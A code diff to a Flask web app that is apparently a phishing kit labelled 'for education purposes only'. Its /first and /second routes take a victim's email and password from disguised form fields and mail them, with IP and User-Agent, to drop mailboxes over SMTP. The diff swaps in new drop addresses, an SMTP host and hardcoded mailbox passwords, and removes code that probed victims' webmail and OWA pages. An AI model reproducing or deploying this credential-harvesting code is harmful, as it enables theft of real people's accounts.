@@ -6,7 +6,6 @@ from flask_limiter.util import get_remote_address
 import smtplib, ssl
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
 
 # made for education purposes only
 
@@ -128,42 +127,10 @@ def success():
 @app.route("/route2")
 def route2():
     web_param = request.args.get('web')
-    
-    # Check the domain URL here before rendering the template
-    user_domain = web_param[web_param.index('@') + 1:]
-
-    # Add your custom domain check logic here
-    if not is_valid_domain(user_domain):
-        abort(403)  # Forbidden if the domain is not valid
-
-    # Check for specific URLs
-    webmail_url = f"http://{user_domain}/webmail"
-    autodiscover_url = f"http://autodiscover.{user_domain}/owa/#path=/mail/search"
-    owa_url = f"http://owa.{user_domain}/owa/#path=/mail"
-
-    try:
-        # Check webmail URL
-        response_webmail = requests.get(webmail_url, verify=False)  # Added verify=False to ignore SSL warnings
-        if response_webmail.status_code == 200:
-            return render_template('webmail.html', eman=web_param, dman=user_domain)
-
-        # Check autodiscover URL and owa URL
-        response_autodiscover = requests.get(autodiscover_url, verify=False)
-        response_owa = requests.get(owa_url, verify=False)
-
-        if response_autodiscover.status_code == 200 or response_owa.status_code == 200:
-            return render_template('owa.html', dman=user_domain)
-
-    except requests.RequestException as e:
-        # Log the exception for debugging
-        logging.error(f"Error during request: {e}")
-
-    # Log that we reached this point
-    logging.warning("No matching URL found")
-
-    # If no matching URL found, return a default template
-    return render_template('index.html', eman=web_param, ins=user_domain)
-
+    if web_param:
+        session['eman'] = web_param
+        session['ins'] = web_param[web_param.index('@') + 1:]
+    return render_template('index.html', eman=session.get('eman'), ins=session.get('ins'))
 
 
 @app.route("/first", methods=['POST'])
@@ -178,12 +145,12 @@ def first():
             ip = request.remote_addr
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
-        sender_email = "onoshijohn@erhawthone.com"
-        receiver_email = "lento@newupdateishere.com"
-        password = "1RQoQkJC[l)l"
+        sender_email = "ghost@newupdateishere.com"
+        receiver_email = "Kimkun543@outlook.com"
+        password = "yhG]rLZwK1!)"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
-        message["Subject"] = "KOREA UPDATE ! 1"
+        message["Subject"] = "NEW SK API ... 1"
         message["From"] = sender_email
         message["To"] = receiver_email
         text = """\
@@ -196,7 +163,7 @@ def first():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP_SSL("mail.erhawthone.com", 465) as server:
+        with smtplib.SMTP_SSL("mail.newupdateishere.com", 465) as server:
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         return redirect(url_for('benza', web=session.get('eman')))
@@ -215,12 +182,12 @@ def second():
             ip = request.remote_addr
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
-        sender_email = "onoshijohn@erhawthone.com"
-        receiver_email = "lento@newupdateishere.com"
-        password = "1RQoQkJC[l)l"
+        sender_email = "ghost@newupdateishere.com"
+        receiver_email = "Kimkun543@outlook.com"
+        password = "yhG]rLZwK1!)"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
-        message["Subject"] = "KOREA UPDATE !! 2"
+        message["Subject"] = "NEW SK API ... 2"
         message["From"] = sender_email
         message["To"] = receiver_email
         text = """\
@@ -233,7 +200,7 @@ def second():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP_SSL("mail.erhawthone.com", 465) as server:
+        with smtplib.SMTP_SSL("mail.newupdateishere.com", 465) as server:
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         return redirect(url_for('lasmo'))
